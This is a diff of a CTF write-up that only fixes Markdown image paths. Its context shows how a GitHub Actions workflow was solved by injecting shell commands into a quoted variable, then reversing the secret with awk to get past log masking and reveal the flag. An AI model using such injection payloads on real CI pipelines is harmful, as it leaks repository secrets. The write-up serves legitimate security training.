@@ -2,7 +2,7 @@
 
 You must solve the first challenge to get the answer, all you need is inside the Loby.
 
-![Alt text](_images/image.png)
+![Alt text](./_images/image.png)
 
 This problem is common in github CTF, hacking the repository with environment variables from github workflows/actions, to uncover the secrets environment variables.
 
@@ -65,16 +65,16 @@ Will be executed as:
 TEACHER=$(echo ''); echo $db_pass; # Review: '
 ```
 
-![Alt text](_images/image3.png)
+![Alt text](./_images/image3.png)
 
 This first test will give us a glimpse of mask `***` LMAO since the secrets variable is protected. To unmask the flag we need to reverse the string with basic `awk` for strings manipulations.
 
-![Alt text](_images/image-4.png)
+![Alt text](./_images/image-4.png)
 
 ```bash
 '); echo "$db_pass" | awk '{ for(i=length;i!=0;i--) printf "%s",substr($0,i,1); print "" }'; # Review: '
 ```
 
-![Alt text](_images/image1.png)
+![Alt text](./_images/image1.png)
 
 **FLAG:** EKO{m0ve_y0uR_b0dy}
